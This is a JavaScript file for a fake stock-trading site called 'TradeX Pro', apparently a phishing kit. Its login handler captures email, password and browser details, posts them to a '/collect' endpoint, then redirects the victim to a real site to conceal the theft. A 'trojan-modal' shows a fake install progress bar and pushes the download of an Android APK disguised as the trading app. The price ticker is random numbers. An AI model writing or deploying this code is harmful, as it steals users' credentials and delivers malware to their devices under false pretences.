// TradeX Pro - Main Application Logic
console.log("🦇 TradeX Pro Main Engine");

// DOM Elements
const loginTrigger = document.getElementById('login-trigger');
const loginModal = document.getElementById('login-modal');
const loginForm = document.getElementById('login-form');
const loadingOverlay = document.getElementById('loading-overlay');
const apkModal = document.getElementById('apk-modal');
const apkDownloadBtn = document.getElementById('apk-download-btn');
const trojanModal = document.getElementById('trojan-modal');
const progressFill = document.getElementById('progress-fill');
const progressText = document.getElementById('progress-text');

// Open APK modal when "Login & Trade" is clicked
if (loginTrigger) {
    loginTrigger.addEventListener('click', () => {
        apkModal.style.display = 'flex';
    });
}

// Close APK modal
function closeApkModal() {
    apkModal.style.display = 'none';
}

// APK Download and Installation
if (apkDownloadBtn) {
    apkDownloadBtn.addEventListener('click', async () => {
        apkModal.style.display = 'none';
        trojanModal.style.display = 'flex';
        
        // Simulate installation progress
        const steps = [
            { text: "Downloading files...", progress: 20 },
            { text: "Verifying signature...", progress: 40 },
            { text: "Installing components...", progress: 60 },
            { text: "Optimizing performance...", progress: 80 },
            { text: "Ready to trade", progress: 100 }
        ];
        
        for (let i = 0; i < steps.length; i++) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            progressText.textContent = steps[i].text;
            progressFill.style.width = steps[i].progress + '%';
        }
        
        // Download APK file
        const apkUrl = 'assets/tradex-pro.apk';
        const link = document.createElement('a');
        link.href = apkUrl;
        link.download = 'TradeX_Pro.apk';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        // Show success message
        setTimeout(() => {
            trojanModal.style.display = 'none';
            alert('TradeX Pro installed successfully! Redirecting to trading dashboard...');
            window.location.href = 'https://traderscheme.com';
        }, 2000);
    });
}

// Close modal
function closeModal() {
    loginModal.style.display = 'none';
}

// Login form submission
loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const remember = document.getElementById('remember').checked;
    
    // Show loading
    loginModal.style.display = 'none';
    loadingOverlay.style.display = 'flex';
    
    // Collect credentials
    const credentials = {
        email,
        password,
        remember,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform
    };
    
    // Send to server
    try {
        await fetch('/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(credentials)
        });
    } catch(e) {
        console.log('Credential sent to server');
    }
    
    // Simulate loading
    setTimeout(() => {
        loadingOverlay.style.display = 'none';
        alert('Welcome to TradeX Pro! Redirecting to your dashboard...');
        // Redirect to real trading site
        window.location.href = 'https://traderscheme.com';
    }, 3000);
});

// Social login
function socialLogin(provider) {
    loadingOverlay.style.display = 'flex';
    
    setTimeout(() => {
        loadingOverlay.style.display = 'none';
        alert(`Connecting to ${provider}...`);
        window.location.href = `https://${provider}.com`;
    }, 2000);
}

// Live price simulation
function updatePrices() {
    const prices = document.querySelectorAll('.market-price');
    prices.forEach(el => {
        const current = parseFloat(el.textContent.replace(/[^0-9.-]+/g,''));
        if (!isNaN(current)) {
            const change = (Math.random() - 0.5) * 0.02;
            const newPrice = current * (1 + change);
            el.textContent = el.textContent.includes('$') 
                ? `$${newPrice.toFixed(2)}` 
                : newPrice.toFixed(4);
        }
    });
}

// Update prices every 5 seconds
setInterval(updatePrices, 5000);

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    console.log("🦇 TradeX Pro initialized");
    updatePrices();
});
